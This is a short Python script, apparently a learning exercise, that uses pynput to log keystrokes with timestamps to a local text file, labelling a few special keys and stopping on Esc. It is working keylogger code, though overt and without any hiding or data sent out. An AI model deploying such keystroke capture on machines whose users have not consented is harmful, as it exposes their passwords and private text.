import logging
from pynput.keyboard import Listener, Key

# Configure logging with timestamps
logging.basicConfig(
    filename="Basic_key_log.txt",
    level=logging.INFO,
    format="%(asctime)s: %(message)s"
)

# Function to handle key press events
def on_press(key):
    try:
        letter = None
        if hasattr(key, 'char') and key.char is not None:
            letter = key.char
        else:
            if key == Key.space:
                letter = "[Space]"
            elif key == Key.enter:
                letter = "[Enter]"
            elif key == Key.backspace:
                letter = "[Backspace]"
            elif key == Key.tab:
                letter = "[Tab]"
            elif key == Key.esc:
                letter = "[Esc]"
                print("Stopping... the keyboard listener.")
                return False
            else:
                return

        logging.info(letter)  # Log with timestamp
    except Exception as e:
        print(f"Error: {e}")

try:
    with Listener(on_press=on_press) as listener:
        print("Starting keyboard listener. Press Esc to stop.")
        listener.join()
except Exception as e:
    print(f"Failed to start listener: {e}")